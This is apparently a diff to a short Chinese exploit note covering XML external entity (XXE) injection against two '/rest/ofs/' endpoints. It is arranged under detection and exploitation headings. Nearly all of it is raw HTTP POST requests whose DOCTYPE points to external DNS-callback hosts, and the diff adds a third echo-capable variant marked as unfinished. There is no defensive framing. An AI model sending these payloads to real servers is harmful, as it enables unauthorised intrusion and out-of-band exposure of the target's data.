@@ -3,7 +3,7 @@
 检测
 
 ```
-POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
+POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
 Host: 
 Content-Type: application/xml
 
@@ -12,7 +12,8 @@ Content-Type: application/xml
 
 利用
 
-接口一：
+利用一：
+
 ```
 POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
 Host: 
@@ -23,7 +24,8 @@ Content-Type: application/xml
 <M><syscode>&send;</syscode></M>
 ```
 
-接口二:
+利用二：
+
 ```
 POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
 Host: 
@@ -31,5 +33,19 @@ Content-Type: application/xml
 
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE syscode SYSTEM "http://dns2.1.eyes.sh">
+<M><syscode>&send;</syscode></M>
+```
+
+利用三：
+
+可回显，待完善
+
+```
+POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
+Host: 
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE syscode SYSTEM "http://dns3.1.eyes.sh">
 <M><syscode>&send;</syscode></M>
 ```
